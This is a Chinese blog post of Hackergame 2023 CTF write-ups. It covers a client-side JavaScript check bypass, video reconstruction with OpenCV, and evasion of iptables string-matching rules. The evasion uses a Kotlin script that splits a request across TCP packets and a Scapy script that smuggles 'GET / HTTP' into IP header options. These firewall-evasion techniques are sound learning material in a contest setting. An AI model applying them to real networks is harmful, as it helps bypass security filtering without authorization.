---
title: 投机取巧向的 Hackergame 2023 Writeups
pubDate: 2023-11-04 17:39:32
description: "第一次完整参加 Hackergame！"
categories: [笔记, CTF]
---

![](./hackergame2023-wirteups/0-1.webp)

基于巧合（~~交友不慎~~），今年终于完整参加了一次 Hackergame。其实往年也有参加，不过当时还是高中，时间不太够，只是做下签到题草草了事。

[官方的 Writeups](https://github.com/USTC-Hackergame/hackergame2023-writeups) 其实已经比较完整了，这里写几题完成方法和官方不太相同（一般更简单）的 Writeups。点击题目标题可以跳转到题目和官方题解。

## [赛博井字棋](https://github.com/USTC-Hackergame/hackergame2023-writeups/tree/master/official/%E8%B5%9B%E5%8D%9A%E4%BA%95%E5%AD%97%E6%A3%8B)

通过观察方法 `setMove(x, y)` 发现判断棋盘非空的逻辑在本地：

```javascript
async function setMove(x, y) {
  if (board[x][y] != 0) { // 注意这里
    return;
  }
  if (frozen) {
    return;
  }
  let url = window.location.href; // 获取当前 URL
  let data = { x: x, y: y }; // 设置要发送的数据
  return fetch(url, {
    method: "POST", // 设置方法为 POST
    headers: {
      "Content-Type": "application/json", // 设置内容类型为 JSON
    },
    body: JSON.stringify(data), // 将数据转换为 JSON 格式
  }).catch(errorHandler);
}
```

在 Chrome 中，直接右键 JS 资源，复写这个文件并把判断代码删除即可。

![](./hackergame2023-wirteups/1-1.webp)

## [🪐 流式星球](https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/official/%F0%9F%AA%90%20%E6%B5%81%E5%BC%8F%E6%98%9F%E7%90%83)

我不是很懂为什么你们题目的代码都用 OpenCV 了，题解不是 OpenCV（

```python
import cv2
import numpy as np

def restore_video(bin_file, restored_video, frame_width, frame_height, frame_count):
    buffer = np.fromfile(bin_file, dtype=np.uint8)
    total_pixels = buffer.size // 3
    padding_needed = np.prod((frame_count, frame_height, frame_width, 3)) - buffer.size
    buffer = np.pad(buffer, (0, padding_needed), mode='constant')
    buffer = buffer.reshape((frame_count, frame_height, frame_width, 3))
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(restored_video, fourcc, 60.0, (frame_width, frame_height))
    for i in range(frame_count):
        out.write(buffer[i])
    out.release()

if __name__ == "__main__":
    frame_width = 427
    frame_height = 759
    frame_count = 9999
    restore_video("video.bin", "restored_video.mp4", frame_width, frame_height, frame_count)
```

## [Komm, süsser Flagge](https://github.com/USTC-Hackergame/hackergame2023-writeups/tree/master/official/Komm%2C%20s%C3%BCsser%20Flagge)

### 我的 POST

通过观察规则 `-A myTCP-1 -p tcp -m string --algo bm --string "POST" -j REJECT --reject-with tcp-reset` 容易得到我们不能在数据包中包含 `POST` 这个字符串，很自然想到拆分成两个数据包。但是一开始使用 `nc` 等工具发现这并做不到，可能 `nc` 还是将他们放在了一个数据包里。这里用 Kotlin 进行简单实现：

```kotlin
fun main() {
    val data = "POST / HTTP/1.1\r\n" +
            "Cookie: GET / HTTP\r\n"+
            "Host: 202.38.93.11\r\n" +
            "Content-Length: 100\r\n\r\n"+
            "YOURTOKEN\r\n";
    Socket().use { socket ->
        socket.connect(InetSocketAddress(InetAddress.getByName("202.38.93.111"), 18080));
        Thread.sleep(1000);
        socket.getOutputStream().write(data.toByteArray(),0,3)
        Thread.sleep(1000);
        socket.getOutputStream().write(data.toByteArray(), 3, data.length - 3)
        socket.getInputStream().bufferedReader().lines().forEach {
            println(it)
        }
    }
}
```

### 我的 P

题都没看，直接试了一下，把上面的 `18080` 改成 `18081` 即可获取 flag。

### 我的 GET

通过观察规则：

```shell
-A myTCP-3 -p tcp -m string --algo bm --from 0 --to 50 --string "GET / HTTP" -j ACCEPT
-A myTCP-3 -p tcp -j REJECT --reject-with tcp-reset
```

容易得到服务器只接受前 50 字节包含 `GET / HTTP` 的数据包。网上查了很多资料，一开始想到用 TFO (TCP Fast Open)，但是迫于我可怜的寄网知识，不是很懂。后来在研究 IP 数据包的 Header 的时候发现有一个区域叫 [Options](https://en.wikipedia.org/wiki/Internet_Protocol_version_4#Options)，似乎可以让我们塞一些东西，所以就有了以下代码：

```python
from scapy.all import *
from scapy.layers.inet import IP, TCP, IPOption

def tcp_test(ip, port, data):
    # 第一次握手，发送SYN包
    # 请求端口和初始序列号随机生成
    p1 = IP(dst=ip,
            options=[IPOption(b'\x88\x0E\x00\x00\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50')]) / TCP(dport=port, sport=RandShort(), seq=RandInt(), flags='S')
    ans = sr1(p1, verbose=True)
    print(ans)
    # 假定此刻对方已经发来了第二次握手包：ACK+SYN
    sport = ans[TCP].dport
    s_seq = ans[TCP].ack
    d_seq = ans[TCP].seq + 1
    # 第三次握手，发送ACK确认包，顺带把数据一起带上
    print(sr1(IP(dst=ip, options=[IPOption(b'\x88\x0E\x00\x00\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50')]) / TCP(dport=port, sport=sport, ack=d_seq, seq=s_seq, flags='A') / data, verbose=True))

if __name__ == '__main__':
    data = 'POST / HTTP/1.1\r\n'
    data += 'Host: 202.38.93.111\r\n'
    data += 'Content-Length: 100\r\n'
    data += 'Accept: text/html\r\n\r\n'
    data += 'YOURTOKEN\r\n'
    tcp_test("202.38.93.111", 18082, data)
```

其中 `\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50` 部分就是 `GET / HTTP`，前面几个字节是 `Copied`、`Option Class`、`Option Number`，我也不是很懂，随便找了个看起来能塞足够长内容的类型——`136/0x88 Stream ID`，然后就可以发包了。

但是，这时候，通过 Wireshark，你很可能发现你的包要不就是没发出去，要不就是服务器返回握手包之后直接被 RST，再次[查了一堆资料](https://stackoverflow.com/questions/9058052/unwanted-rst-tcp-packet-with-scapy)之后，可以发现是内核认为这个数据包有问题，帮我们自动发送了 RST。于是，这时候就该使用题目中提供的 OpenVPN 了。

![](./hackergame2023-wirteups/2-1.jpg)

---

其他题目的解法我都基本和官方一样，不再赘述。
